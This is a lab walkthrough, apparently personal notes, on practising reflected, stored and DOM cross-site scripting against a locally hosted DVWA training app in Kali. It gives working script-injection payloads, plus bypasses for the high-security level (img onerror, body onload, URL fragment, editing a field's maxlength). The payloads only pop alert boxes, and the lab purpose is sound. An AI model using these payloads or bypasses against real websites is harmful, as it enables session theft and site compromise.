# Implementing XSS (Cross-site Scripting) in kali using DVWA.

# To start apache2 server
sudo service apache2 start

# To check if apache2 server is running properly
systemctl status apache2
# if you see active (running)
# the server is running properly

# To start mysql server
sudo service mysql start

# To check if mysql server is running properly
systemctl status mysql
# if you see active (running)
# the server is running properly

# Now go to browser and user url
http://127.0.0.1/dvwa/

# If you are not directly prompted to login page try below steps

#scroll down and click on crete database
#if you see any errors on database connection
#possible solutions will be
#1. changing username and password of database in the config file
# this file will be in folder dvwa/config
# Opening config file to change username and password
#sudo nano config.inc.php
#make db_ser to user and db_password to pass

# Save the file(Ctrol + O, then Enter) and Exit(Ctrl + X)

# Once Databsae connection is successfull
# Log in using username: admin and password: password

# Go to DVWA Security and set it to low

# Then go to XSS(REflected)
# In the name field you can enter js query which will be executed when we click on submit
script: <script>alert("Jay")</script>


# Now go to XSS (Stored)
# Enter Name and Message
# in message you will give js query
# once you click on submit guestbook your js query will be stored
# and it will be executed every time you visit that page
# you could clear all the entered query by clicking on clear guestbook
Name: Jay
Message (script) : <script>alert("Jay")</script>


# Now go to XSS (DOM)
# Choose a language and click on select
# url will be updated
# you can insert js query after ?default= in url which will be then executed once you press enter
# eg. 127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert("Jay")</script>

# Now again go to DVWA Security and change it to high
# Now the above queries will not be executed as the security is set to high
# so we need some different ways to fire our queries

# XSS (Reflected)
<img src=x onerror=alert("Jay")>

# XSS (Stored)
# as the security is set high the query in the message box will not get executed
# so we can enter the query in name field 
# but the problem is name field has a limit of 10 character
# so we can bypass it by editing the html (ctrl + shift + I)
# Once Inspection is open chage maxlength to 100
<body onload=alert("Jay")>

# XSS (DOM)
English#<script>alert("Jay")</script>
